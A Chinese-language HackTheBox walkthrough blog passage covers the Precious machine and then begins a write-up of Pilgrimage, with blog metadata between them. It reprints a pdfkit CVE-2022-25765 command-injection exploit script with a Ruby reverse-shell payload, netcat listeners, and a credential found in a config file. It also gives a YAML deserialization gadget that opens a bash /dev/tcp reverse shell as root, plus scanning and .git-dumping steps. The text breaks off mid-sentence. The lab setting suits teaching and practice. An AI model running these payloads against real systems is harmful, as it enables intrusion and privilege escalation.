python3 exploit-CVE-2022–25765.py -hOptions:  -c    Custom command mode. Provide command to generate custom payload with.  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.  -w    URL of website running vulnerable pdfkit. (Optional)  -p    POST parameter on website running vulnerable pdfkit. (Optional)  -h    Show this help menu.&quot;&quot;&quot;)    exit()def loading(spins):    def spinning_cursor():        while True:            for cursor in &#x27;|/-\\\\&#x27;:                yield cursor    spinner = spinning_cursor()    for _ in range(spins):        sys.stdout.write(next(spinner))        sys.stdout.flush()        time.sleep(0.1)        sys.stdout.write(&#x27;\\b&#x27;)# Run the exploitdef exploit(payload, exploitMode, postArg):    UNICORD_ASCII()    print(f&quot;&#123;color.blue&#125;UNICORD: &#123;color.red&#125;Exploit for CVE-2022–25765 (pdfkit) - Command Injection&#123;color.no&#125;&quot;)    loading(15)    print(f&quot;&#123;color.blue&#125;OPTIONS: &#123;color.gold&#125;&#123;modes[exploitMode]&#125;&#123;color.no&#125;&quot;)    print(f&quot;&#123;color.blue&#125;PAYLOAD: &#123;color.gold&#125;&quot; + payload + f&quot;&#123;color.no&#125;&quot;)    if &quot;web&quot; in exploitMode:        if exploitMode == &quot;webcommand&quot;:            print(                f&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Wrap custom command in \\&quot;quotes\\&quot; if it has spaces.&#123;color.no&#125;&quot;)        else:            print(                f&quot;&#123;color.blue&#125;LOCALIP: &#123;color.gold&#125;&#123;listenIP&#125;:&#123;listenPort&#125;&#123;color.no&#125;&quot;)            print(                f&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Be sure to start a local listener on the above IP and port. \\&quot;nc -lnvp &#123;listenPort&#125;\\&quot;.&#123;color.no&#125;&quot;)        print(f&quot;&#123;color.blue&#125;WEBSITE: &#123;color.gold&#125;&#123;website&#125;&#123;color.no&#125;&quot;)        print(f&quot;&#123;color.blue&#125;POSTARG: &#123;color.gold&#125;&#123;postArg&#125;&#123;color.no&#125;&quot;)        if &quot;http&quot; not in website:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Make sure website has schema! Like \\&quot;http://\\&quot;.&#123;color.no&#125;&quot;)            exit()        postArg = postArg + &quot;=&quot; + quote(payload, safe=&quot;&quot;)        try:            response = requests.post(website, postArg)        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Couldn&#x27;t connect to website!&#123;color.no&#125;&quot;)            exit()        loading(15)        print(f&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.gold&#125;Payload sent to website!&#123;color.no&#125;&quot;)        loading(15)        print(f&quot;&#123;color.blue&#125;SUCCESS: &#123;color.green&#125;Exploit performed action.&#123;color.no&#125;&quot;)    elif exploitMode == &quot;command&quot;:        print(f&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Wrap custom command in \\&quot;quotes\\&quot; if it has spaces.&#123;color.no&#125;&quot;)        loading(15)        print(            f&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.green&#125;Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.&#123;color.no&#125;&quot;)    elif exploitMode == &quot;shell&quot;:        print(f&quot;&#123;color.blue&#125;LOCALIP: &#123;color.gold&#125;&#123;listenIP&#125;:&#123;listenPort&#125;&#123;color.no&#125;&quot;)        print(f&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Be sure to start a local listener on the above IP and port.&#123;color.no&#125;&quot;)        loading(15)        print(            f&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.green&#125;Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.&#123;color.no&#125;&quot;)    exit()if __name__ == &quot;__main__&quot;:    args = [&#x27;-h&#x27;, &#x27;-c&#x27;, &#x27;-s&#x27;, &#x27;-w&#x27;, &#x27;-p&#x27;]    modes = &#123;&#x27;command&#x27;: &#x27;Custom Command Mode&#x27;,             &#x27;shell&#x27;: &#x27;Reverse Shell Mode&#x27;,             &#x27;webcommand&#x27;: &#x27;Custom Command Send to Target Website Mode&#x27;,             &#x27;webshell&#x27;: &#x27;Reverse Shell Sent to Target Website Mode&#x27;&#125;    postArg = &quot;url&quot;    if args[0] in sys.argv:        help()    elif args[1] in sys.argv and not args[2] in sys.argv:        try:            if sys.argv[sys.argv.index(args[1]) + 1] in args:                raise            command = sys.argv[sys.argv.index(args[1]) + 1]        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a custom command! \\&quot;-c &lt;command&gt;\\&quot;&#123;color.no&#125;&quot;)            exit()        payload = f&quot;http://%20`&#123;command&#125;`&quot;        mode = &quot;command&quot;    elif args[2] in sys.argv and not args[1] in sys.argv:        try:            if &quot;-&quot; in sys.argv[sys.argv.index(args[2]) + 1]:                raise            listenIP = sys.argv[sys.argv.index(args[2]) + 1]        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target and port! \\&quot;-s &lt;target-IP&gt; &lt;target-port&gt;\\&quot;&#123;color.no&#125;&quot;)            exit()        try:            if &quot;-&quot; in sys.argv[sys.argv.index(args[2]) + 2]:                raise            listenPort = sys.argv[sys.argv.index(args[2]) + 2]        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target port! \\&quot;-t &lt;target-IP&gt; &lt;target-port&gt;\\&quot;&#123;color.no&#125;&quot;)            exit()        payload = f&quot;http://%20`ruby -rsocket -e&#x27;spawn(\\&quot;sh\\&quot;,[:in,:out,:err]=&gt;TCPSocket.new(\\&quot;&#123;str(listenIP)&#125;\\&quot;,\\&quot;&#123;str(listenPort)&#125;\\&quot;))&#x27;`&quot;        mode = &quot;shell&quot;    else:        help()    if args[3] in sys.argv and args[4] in sys.argv:        try:            if &quot;-&quot; in sys.argv[sys.argv.index(args[3]) + 1] and len(sys.argv[sys.argv.index(args[3]) + 1]) == 2:                raise            website = sys.argv[sys.argv.index(args[3]) + 1]            mode = &quot;web&quot; + mode        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \\&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\\&quot;&#123;color.no&#125;&quot;)            exit()        try:            if &quot;-&quot; in sys.argv[sys.argv.index(args[4]) + 1] and len(sys.argv[sys.argv.index(args[4]) + 1]) == 2:                raise            postArg = sys.argv[sys.argv.index(args[4]) + 1]        except:            print(                f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \\&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\\&quot;&#123;color.no&#125;&quot;)            exit()    elif args[3] in sys.argv or args[4] in sys.argv:        print(            f&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Provide a target site and post parameter! \\&quot;-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;\\&quot;&#123;color.no&#125;&quot;)        exit()    exploit(payload, mode, postArg)  \n\n看不懂ruby也无所谓，能看懂帮助信息就行。\nUsage:  python3 exploit-CVE-2022–25765.py -c &lt;command&gt;  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;  python3 exploit-CVE-2022–25765.py -c &lt;command&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]  python3 exploit-CVE-2022–25765.py -hOptions:  -c    Custom command mode. Provide command to generate custom payload with.  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.  -w    URL of website running vulnerable pdfkit. (Optional)  -p    POST parameter on website running vulnerable pdfkit. (Optional)  -h    Show this help menu.\n\n我们可以直接用python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]这条指令直接拿到反弹shell。当然，必要的参数不能少： -w htp://precious.htb -p url。-p这个POST参数是哪来的呢，打开控制台查看Network里面可以查看Request就可以找到。实际上就是网页用form表单形式提交数据。因为是命令注入，所以我们的payload填到里面就可以执行。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ python3 51293.py -s 10.10.10.128 443 -w http://precious.htb -p url        _ __,~~~/_        __  ___  _______________  ___  ___    ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....    UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command InjectionOPTIONS: Reverse Shell Sent to Target Website ModePAYLOAD: http://%20`ruby -rsocket -e&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;10.10.10.128&quot;,&quot;443&quot;))&#x27;`                                                                                         LOCALIP: 10.10.10.128:443WARNING: Be sure to start a local listener on the above IP and port. &quot;nc -lnvp 443&quot;.WEBSITE: http://precious.htbPOSTARG: urlEXPLOIT: Payload sent to website!SUCCESS: Exploit performed action.\n\n另一边终端开启nc监听443就可以连接上了。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nc -lvp 443                    [sudo] password for kali: listening on [any] 443 ... connect to [10.10.10.128] from precious.htb [10.10.10.133] 54028whoamiruby\n\n备注如果想尝试用手动方式验证，可以用\nhttp://20%`sleep 5`\n\n如果停了5s就说明PoC有效。为啥不能用whoami或者ls？因为没回显。\n提权提权到其他用户拿到shell的第一件事当然是先用python搞一个交互性更好的shell。没有python记得看看有没有python3。\nwhich pythonwhich python3/usr/bin/python3python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;ruby@precious:/var/www/pdfapp$\n\n那么接着的第一件事就是sudo -l,要密码，过。\n那就先手动遍历下文件吧。首先要看的就是home目录。\nruby@precious:/var/www/pdfapp$ cd /homecd /homeruby@precious:/home$ ls -lals -latotal 20drwxr-xr-x  5 root        root        4096 Jun 12 04:23 .drwxr-xr-x 19 root        root        4096 May 16 10:31 ..drwxr-xr-x 15 gaoxiaodiao gaoxiaodiao 4096 Jun 12 05:40 gaoxiaodiaodrwxr-xr-x  5 henry       henry       4096 Jun 12 05:10 henrydrwxr-xr-x  4 ruby        ruby        4096 Jun 12 04:23 ruby\n\n我们发现有三个用户。\n一个个看吧。gaoxiaodiao里面啥也没有。henry里面能看的没啥用，想看user flag的没权限。\nuby@precious:/home/henry$ ls -lals -latotal 36drwxr-xr-x 5 henry henry 4096 Jun 12 05:10 .drwxr-xr-x 5 root  root  4096 Jun 12 04:23 ..lrwxrwxrwx 1 henry henry    9 Jun 12 04:23 .bash_history -&gt; /dev/null-rw-r--r-- 1 henry henry  220 Jun 12 04:23 .bash_logout-rw-r--r-- 1 henry henry 3974 Jun 12 05:07 .bashrcdrwx------ 2 henry henry 4096 Jun 12 05:08 .cachedrwx------ 3 henry henry 4096 Jun 12 04:56 .configdrwxr-xr-x 3 henry henry 4096 Jun 12 04:23 .local-rw-r--r-- 1 henry henry  807 Jun 12 04:23 .profile-rw-r----- 1 henry henry  536 Jun 12 05:01 user.txtlrwxrwxrwx 1 henry henry    9 Jun 12 05:10 .viminfo -&gt; /dev/null\n\n乖乖看ruby自己的home目录吧。\nruby@precious:~$ ls -lals -latotal 28drwxr-xr-x 4 ruby ruby 4096 Jun 12 04:23 .drwxr-xr-x 5 root root 4096 Jun 12 04:23 ..lrwxrwxrwx 1 ruby ruby    9 Jun 12 04:23 .bash_history -&gt; /dev/null-rw-r--r-- 1 ruby ruby  220 Jun 12 04:23 .bash_logout-rw-r--r-- 1 ruby ruby 3771 Jun 12 04:23 .bashrcdr-xr-xr-x 2 ruby ruby 4096 Jun 12 04:23 .bundledrwxr-xr-x 3 ruby ruby 4096 Jun 12 04:23 .cache-rw-r--r-- 1 ruby ruby  807 Jun 12 04:23 .profileruby@precious:~$ cd .bundcd .bundle/ruby@precious:~/.bundle$ ls -lals -latotal 12dr-xr-xr-x 2 ruby ruby 4096 Jun 12 04:23 .drwxr-xr-x 4 ruby ruby 4096 Jun 12 04:23 ..-r-xr-xr-x 1 ruby ruby   62 Jun 12 04:23 configruby@precious:~/.bundle$ cat cconfigcat config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;ruby@precious:~/.bundle$ su henrysu henryPassword: Q3c1AqGHtoI0aXAYFHhenry@precious:/home/ruby/.bundle$\n\n我们在ruby的home目录下的/.bundle里的config文件里找到的henry的用户凭证，而且竟然是真的。我们可以成功切换到henry用户。\n提权到root刚才的shell交互性很拉，且机子是开了ssh的，那我们直接ssh连进来。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ ssh henry@10.10.10.133            The authenticity of host &#x27;10.10.10.133 (10.10.10.133)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:hhZ2PP71pBNZ2j6slM0FYVNYiySWo+MZtY1HNrglpHs.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;10.10.10.133&#x27; (ED25519) to the list of known hosts.henry@10.10.10.133&#x27;s password: Last login: Mon Jun 12 05:13:05 2023 from 192.168.42.1henry@precious:~$ ls -latotal 36drwxr-xr-x 5 henry henry 4096 Jun 12 05:10 .drwxr-xr-x 5 root  root  4096 Jun 12 04:23 ..lrwxrwxrwx 1 henry henry    9 Jun 12 04:23 .bash_history -&gt; /dev/null-rw-r--r-- 1 henry henry  220 Jun 12 04:23 .bash_logout-rw-r--r-- 1 henry henry 3974 Jun 12 05:07 .bashrcdrwx------ 2 henry henry 4096 Jun 12 05:08 .cachedrwx------ 3 henry henry 4096 Jun 12 04:56 .configdrwxr-xr-x 3 henry henry 4096 Jun 12 04:23 .local-rw-r--r-- 1 henry henry  807 Jun 12 04:23 .profile-rw-r----- 1 henry henry  536 Jun 12 05:01 user.txtlrwxrwxrwx 1 henry henry    9 Jun 12 05:10 .viminfo -&gt; /dev/nullhenry@precious:~$ cat user.txt bf***************************1b\n\n登进来拿到user flag。\n该提权到root了。那么接着第一步sudo -l\nhenry@precious:/home$ sudo -lMatching Defaults entries for henry on precious:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser henry may run the following commands on precious:    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n\n发现可以无密码sudo ruby /opt/update_dependencies.rb。\n那我们看看能不能对这里下手。\n先看看这个ruby文件里写了啥。\nhenry@precious:/opt$ cat update_dependencies.rb # Compare installed dependencies with those specified in &quot;dependencies.yml&quot;require &quot;yaml&quot;require &#x27;rubygems&#x27;# TODO: update versions automaticallydef update_gems()enddef list_from_file    YAML.load(File.read(&quot;dependencies.yml&quot;))enddef list_local_gems    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version|    gems_local.each do |local_name, local_version|        if(file_name == local_name)            if(file_version != local_version)                puts &quot;Installed version differs from the one specified in file: &quot; + local_name            else                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name            end        end    endend\n\n和注释里写的差不多，读dependencies.yml文件并和本地安装的依赖对比版本。\n虽然能大致看懂这段代码，但是我们该怎么利用呢。直接Google一下吧：ruby priv esca,查到一个网页介绍了如何用ruby脚本提权。实际上是用了yaml的反序列。\n#Check if the current user could run the ruby script as root privilege.# (root) NOPASSWD: /usr/bin/ruby sample.rb#If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: &quot;abc&quot;      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module &#x27;Kernel&#x27;                 method_id: :system             git_set: &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;local-ip&gt;/&lt;local-port&gt; 0&gt;&amp;1&#x27;&quot;         method_id: :resolve\n\n和我们目前的情况完全匹配，照葫芦画瓢就行了。在/tmp目录下创建dependencies.yml文件，把上面这段复制进去，改个ip和端口再在攻击上开个nc监听。然后直接执行脚本应该就可以了。\nhenry@precious:/tmp$ sudo ruby /opt/update_dependencies.rbsh: 1: reading: not found\n\nnc监听一下。\n┌──(kali㉿kali)-[~/HTB/Precious/workSpace]└─$ sudo nc -lvp 443[sudo] password for kali: listening on [any] 443 ...connect to [10.10.10.128] from precious.htb [10.10.10.133] 41114root@precious:/tmp# cd ~cd ~root@precious:~# ls -lals -latotal 36drwx------  6 root root 4096 Jun 12 05:02 .drwxr-xr-x 19 root root 4096 May 16 10:31 ..lrwxrwxrwx  1 root root    9 Jun 12 05:02 .bash_history -&gt; /dev/null-rw-r--r--  1 root root 3300 Jun 12 05:06 .bashrcdrwxr-xr-x  3 root root 4096 Jun 12 04:39 .bundledrwxr-xr-x  3 root root 4096 Jun 12 04:24 .gem-rw-r--r--  1 root root  161 Dec  5  2019 .profile-rw-r--r--  1 root root  504 Jun 12 05:02 root.txtdrwx------  3 root root 4096 May 16 10:37 snapdrwx------  2 root root 4096 May 16 10:37 .sshlrwxrwxrwx  1 root root    9 Jun 12 05:02 .viminfo -&gt; /dev/nullroot@precious:~# cat rootcat root.txt *****************************\n\n成功拿到root flag。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[HTB]  Pilgrimage","url":"/2023/07/15/Pilgrimage/","content":"\n\n\n\n\n前言虽然是HTB上easy难度的靶机，其实还是要有点难度的。主打的就是一个信息收集能力以及经验。值得尝试。\n信息收集nmap扫描┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sudo nmap -p- --min-rate=10000 10.10.11.219                              [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:02 CSTNmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.27s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 13.24 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sudo nmap -sV -sT -O -p22,80 10.10.11.219  Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:07 CSTNmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.26s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80/tcp open  http    nginx 1.18.0Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (96%), Linux 5.0 - 5.3 (95%), Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sudo nmap --script=vuln 10.10.11.219       Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:08 CSTStats: 0:06:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 98.52% done; ETC: 16:15 (0:00:05 remaining)Stats: 0:13:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.01% done; ETC: 16:22 (0:00:07 remaining)Nmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.26s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http| http-git: |   10.10.11.219:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-fileupload-exploiter: ERROR: Script execution failed (use -d to debug)| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=pilgrimage.htb|   Found the following possible CSRF vulnerabilities: |     |     Path: http://pilgrimage.htb:80/|     Form id: filename|     Form action: /|     |     Path: http://pilgrimage.htb:80/dashboard.php|     Form id: |     Form action: /login.php|     |     Path: http://pilgrimage.htb:80/register.php|     Form id: |     Form action: /register.php|     |     Path: http://pilgrimage.htb:80/login.php|     Form id: |_    Form action: /login.php|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set| http-enum: |   /login.php: Possible admin folder|_  /.git/HEAD: Git folderNmap done: 1 IP address (1 host up) scanned in 1021.09 seconds\n\n省流一下就是发现80和22端口开着，且网站的Git仓库没删。git信息收集这块是我们接下来肯定要考虑的步骤。\nwhatweb┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sudo whatweb http://10.10.11.219http://10.10.11.219 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.219], RedirectLocation[http://pilgrimage.htb/], Title[301 Moved Permanently], nginx[1.18.0]http://pilgrimage.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]\n\nwhatweb第一次扫的时候显示跳转，所以我们去hosts里把跳转地址http://pilgrimage.htb/给加上。网站大致的技术栈我们也了解了。\nnikto┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sudo nikto -h http://pilgrimage.htb    - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.219+ Target Hostname:    pilgrimage.htb+ Target Port:        80+ Start Time:         2023-07-11 15:20:56 (GMT8)---------------------------------------------------------------------------+ Server: nginx/1.18.0+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /login.php: Admin login page/section found.+ /.git/index: Git Index file may contain directory listing information.+ /.git/HEAD: Git HEAD file found. Full repo details may be present.+ /.git/config: Git config file found. Infos about repo details may be present.+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 7973 requests: 6 error(s) and 8 item(s) reported on remote host+ End Time:           2023-07-11 16:18:44 (GMT8) (3468 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n因为有延迟的问题，可能会扫的很慢。但是好消息是还是给我们带来了有用信息：这一堆.git目录下的文件告诉我们网站所有者将网页服务上线时没把.git文件夹给删掉，这很可能导致源代码泄露，那我们之后就用工具给他下载下来看看。\nweb渗透手动访问网站既然nmap扫出了80端口的web网站，我们先登上去看看网站是啥情况。\n\n网站实现的内容就是一个上传图片然后网页给你压缩并返回结果图片的链接。登录和注册页面没啥用，不涉及什么后台管理员登录页面。\n了解了网站提供的服务，那他是怎么实现的呢？我们先google一下pilgrimage是不是一个通用的服务，发现并不是。那手动网页遍历就暂时没啥信息了，先回到之前我们发现的.git源码泄露这条路看看走不走得通吧。\n.git源码泄露我们直接使用GitHack这个工具对网站的git文件进行一个提取。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ python3 ~/Tools/GitHack-master/GitHack.py http://pilgrimage.htb/.git[+] Download and parse index file ...[+] assets/bulletproof.php[+] assets/css/animate.css[+] assets/css/custom.css[+] assets/css/flex-slider.css[+] assets/css/fontawesome.css[+] assets/css/owl.css[+] assets/css/templatemo-woox-travel.css[+] assets/images/banner-04.jpg[+] assets/images/cta-bg.jpg[+] assets/js/custom.js[+] assets/js/isotope.js[+] assets/js/isotope.min.js[+] assets/js/owl-carousel.js[+] assets/js/popup.js[+] assets/js/tabs.js[+] assets/webfonts/fa-brands-400.ttf[+] assets/webfonts/fa-brands-400.woff2[+] assets/webfonts/fa-regular-400.ttf[+] assets/webfonts/fa-regular-400.woff2[+] assets/webfonts/fa-solid-900.ttf[+] assets/webfonts/fa-solid-900.woff2[+] assets/webfonts/fa-v4compatibility.ttf[+] assets/webfonts/fa-v4compatibility.woff2[+] dashboard.php[+] index.php[+] login.php[+] logout.php[+] magick[+] register.php[+] vendor/bootstrap/css/bootstrap.min.css[+] vendor/bootstrap/js/bootstrap.min.js[+] vendor/jquery/jquery.js[+] vendor/jquery/jquery.min.js[+] vendor/jquery/jquery.min.map[+] vendor/jquery/jquery.slim.js[+] vendor/jquery/jquery.slim.min.js[+] vendor/jquery/jquery.slim.min.map[OK] assets/bulletproof.php[OK] assets/css/custom.css[OK] assets/css/flex-slider.css[OK] assets/css/owl.css[OK] assets/js/custom.js[OK] assets/css/fontawesome.css[OK] assets/images/cta-bg.jpg[OK] assets/js/popup.js[OK] assets/css/templatemo-woox-travel.css[OK] assets/js/isotope.min.js[OK] assets/js/isotope.js[OK] assets/webfonts/fa-regular-400.woff2[OK] assets/webfonts/fa-regular-400.ttf[OK] assets/js/owl-carousel.js[OK] assets/css/animate.css[OK] dashboard.php[OK] assets/webfonts/fa-v4compatibility.woff2[OK] assets/webfonts/fa-v4compatibility.ttf[OK] index.php[OK] logout.php[OK] login.php[OK] assets/webfonts/fa-brands-400.woff2[OK] register.php[OK] vendor/bootstrap/css/bootstrap.min.css[OK] vendor/bootstrap/js/bootstrap.min.js[OK] vendor/jquery/jquery.min.js[OK] assets/webfonts/fa-brands-400.ttf[OK] assets/webfonts/fa-solid-900.woff2[OK] vendor/jquery/jquery.slim.min.js[OK] vendor/jquery/jquery.slim.min.map[OK] vendor/jquery/jquery.js[OK] vendor/jquery/jquery.min.map[OK] assets/webfonts/fa-solid-900.ttf[OK] vendor/jquery/jquery.slim.js[OK] assets/js/tabs.js[OK] assets/images/banner-04.jpg[OK] magick                                                                                                          \n\n还是因为vpn连接的问题，下的好慢……不过好歹下载下来了，看看内容。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]└─$ lltotal 26960drwxr-xr-x 6 kali kali     4096 Jul 11 17:48 assets-rw-r--r-- 1 kali kali     5538 Jul 11 17:48 dashboard.php-rw-r--r-- 1 kali kali     9250 Jul 11 17:48 index.php-rw-r--r-- 1 kali kali     6822 Jul 11 17:48 login.php-rw-r--r-- 1 kali kali       98 Jul 11 17:48 logout.php-rw-r--r-- 1 kali kali 27555008 Jul 11 18:35 magick-rw-r--r-- 1 kali kali     6836 Jul 11 17:48 register.phpdrwxr-xr-x 4 kali kali     4096 Jul 11 17:48 vendor\n\n这么多文件，我们首先要看什么呢？当然是index.php了。因为我们想搞清楚网站图片压缩服务是怎么实现的，看看它的实现是否存在漏洞可以利用。所以我们肯定要先看这个\n             &lt;?phpsession_start();require_once &quot;assets/bulletproof.php&quot;;function isAuthenticated() &#123;  return json_encode(isset($_SESSION[&#x27;user&#x27;]));&#125;function returnUsername() &#123;  return &quot;\\&quot;&quot; . $_SESSION[&#x27;user&#x27;] . &quot;\\&quot;&quot;;&#125;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;  $image = new Bulletproof\\Image($_FILES);  if($image[&quot;toConvert&quot;]) &#123;    $image-&gt;setLocation(&quot;/var/www/pilgrimage.htb/tmp&quot;);    $image-&gt;setSize(100, 4000000);    $image-&gt;setMime(array(&#x27;png&#x27;,&#x27;jpeg&#x27;));    $upload = $image-&gt;upload();    if($upload) &#123;      $mime = &quot;.png&quot;;      $imagePath = $upload-&gt;getFullPath();      if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) &#123;        $mime = &quot;.jpeg&quot;;      &#125;      $newname = uniqid();      exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);      unlink($upload-&gt;getFullPath());      $upload_path = &quot;http://pilgrimage.htb/shrunk/&quot; . $newname . $mime;      if(isset($_SESSION[&#x27;user&#x27;])) &#123;        $db = new PDO(&#x27;sqlite:/var/db/pilgrimage&#x27;);        $stmt = $db-&gt;prepare(&quot;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&quot;);        $stmt-&gt;execute(array($upload_path,$_FILES[&quot;toConvert&quot;][&quot;name&quot;],$_SESSION[&#x27;user&#x27;]));      &#125;      header(&quot;Location: /?message=&quot; . $upload_path . &quot;&amp;status=success&quot;);    &#125;    else &#123;      header(&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;);    &#125;  &#125;  else &#123;    header(&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;);  &#125;&#125;?&gt;\n\n文件开头就清晰的告诉了我们：exec(&quot;/var/www/pilgrimage.htb/magick convert 